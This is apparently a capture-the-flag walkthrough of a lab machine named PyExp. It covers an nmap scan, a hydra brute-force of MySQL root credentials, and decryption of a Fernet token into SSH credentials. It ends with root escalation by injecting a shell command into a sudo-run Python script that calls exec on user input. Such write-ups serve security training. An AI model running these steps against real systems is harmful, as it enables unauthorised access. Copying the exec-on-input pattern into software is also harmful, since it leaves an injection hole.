# PyExp

## Nmap

```
sudo nmap 192.168.75.118 -p- -sS -sV                

PORT     STATE SERVICE VERSION
1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

With only `SSH` and `MySQL` open we can start bruteforcing MySQL. As the root account generally always exists we can start by bruteforcing this using the rockyou.txt wordlist.

```
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.75.118
```

![](<../../../.gitbook/assets/image (1343) (1).png>)

With the valid credentials of `root:prettywoman` we can now login to MySQL.

```
mysql -u root -p -h 192.168.75.118
```

![](<../../../.gitbook/assets/image (1344).png>)

Viewing available databases we find the database 'data' which contains a table called 'fernet'. This table contains a token and key as shown below.

![](<../../../.gitbook/assets/image (1345).png>)

The values are:

```
cred

gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= 

keyy

UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=
```

I tried decoding these with base64 and a few others. No luck with any legible output. Researching the words fernet and encode give us the following result: [https://asecuritysite.com/encryption/ferdecode](https://asecuritysite.com/encryption/ferdecode)

Entering the details we have found give the results below.

![https://asecuritysite.com/encryption/ferdecode](<../../../.gitbook/assets/image (1346).png>)

These credentials returned are: ``lucy:wJ9`"Lemdv9[FEw-`` Which allow us to login with SSH as the user lucy.

```
ssh -p 1337 lucy@192.168.75.118
```

![](<../../../.gitbook/assets/image (1347).png>)

Checking sudo permissions with `sudo -l` shows we can run `/usr/bin/python2 /opt/exp.py` as root without specifying a password.

![](<../../../.gitbook/assets/image (1348) (1).png>)

Reading the contents of /opt/exp.py:

```
uinput = raw_input('how are you?')
exec(uinput)
```

Looks like this script will ask us a question which prompts raw input. If we can escape the shell whilst the script is active we should be able to maintain escalated privileges. Use the command below to escape the shell when prompted for input.

```
import os; os.system("/bin/sh")
```

![](<../../../.gitbook/assets/image (1354).png>)
